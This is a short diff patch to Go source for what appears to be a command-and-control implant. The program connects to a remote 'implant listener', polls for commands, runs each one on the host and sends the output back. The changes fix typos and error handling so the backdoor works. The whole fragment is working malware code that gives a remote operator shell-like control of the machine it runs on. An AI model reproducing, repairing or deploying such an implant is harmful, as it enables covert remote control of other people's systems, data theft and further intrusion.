@@ -24,15 +24,16 @@ func main(){
     log.Fatalf("[-]   Error dialing implant listener: %v",err)
   }
   defer conn.Close()
-  cliet = stream.NewImplantClient(conn)
+  client = stream.NewImplantClient(conn)
   ctx := context.Background()
   for{
     var req = new(stream.Empty)
-    if cmd,err := client.FetchCommand(ctx,req); err != nil{
+    cmd,err := client.FetchCommand(ctx,req)
+    if err != nil{
       log.Fatalf("[-] Error fetching coomand: %v",err)
     }
     if cmd.In == "" {
-      time.Sleep(3 * time.Seccond)
+      time.Sleep(3 * time.Second)
       continue
     }
     tokens := strings.Split(cmd.In," ")
@@ -44,7 +45,7 @@ func main(){
     }
     buf,err := c.CombinedOutput()
     if err != nil{
-      cmd.out = err.Error()
+      cmd.Out = err.Error()
     }
     cmd.Out += string(buf)
     client.SendOutput(ctx,cmd)
